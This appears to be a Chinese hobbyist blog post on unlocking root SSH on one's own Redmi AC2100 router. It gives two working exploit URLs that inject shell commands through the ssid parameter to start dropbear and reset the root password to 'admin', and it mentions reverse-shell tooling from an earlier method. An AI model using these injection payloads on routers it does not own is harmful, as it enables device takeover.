---
date: 2021-01-29
title: 红米 AC2100 开启 SSH 权限
tags:
  - 刷机
  - 路由器
---
> TL;DR [看这里](https://www.right.com.cn/forum/thread-4032490-1-1.html)，成功版本为 `2.0.23 稳定版`。


之前按照 [这篇](https://www.xiaoz.me/archives/15192) 想开启路由器的 telnet 权限。

dalao 写了一些脚本，但是遇到了很多问题，包括但不限于：
- 由于忘关火绒导致 nc 被删除，弹出 `nc.exe不是内部或外部命令，也不是可运行的程序或批处理文件。8081端口被占用，请检查`。解决方法为进入火狐的恢复区恢复文件，并添加信任，以免误删。
- 获取包的时候脚本报错，但还是提示 PPPOE 获取成功。这个问题原因为演示版本为 `1.0.14`，而新路由器被官方自动升级为了 `2.0.23`，方法已不再适用。解决方法为从 `官方救砖工具以及原厂固件备份` 文件夹中手动上传 `1.0.14` 包升级 ROM。
- 第一次失败，无法继续。解决方法为断开 WAN LAN 口相连线，然后重试。

> 简单看了一下，dalao 应该是开启了一个 http 服务器（python -m http.server），然后在反弹 shell 那几个阶段从本地服强制覆盖官方文件。~~然后之所以破解包那么大是因为居然有整个 python，，，~~

爪巴了。

突然看到 [帖子说](https://www.right.com.cn/forum/thread-4032490-1-1.html) 有 XSS  注入漏洞可以钻，试了下直接拿下了 SSH 的 root 权限：

首先注销登陆的账户，然后重新登陆，这时观察浏览器顶上的 url,会有 `stok` 的参数，这就是 token 啦。有了 token 按照帖子里的办法就办法注入了，只需要两次就行。一次开启 SSH 功能，第二次是将密码修改为 admin。第二次是可选的，但是不这样的话需要找到无序的默认密码，不方便我们后续操作。

去掉 `#` 开头的注释，把链接复制到浏览器里面，**注意把 `<STOK>` 替换为自己的。**

```bash
# enable SSH

http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B

# (optional) change password to `admin`
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20echo%20-e%20'admin%5Cnadmin'%20%7C%20passwd%20root%3B

```

然后就可以愉快的登陆啦（密码为 `admin`）

```bash
ssh root@192.168.31.1
```

当然可以直接拿这个注入漏洞修改很多东西www，不过这样还是太麻烦了，所以直接拿到 SSH 权限上去吧。
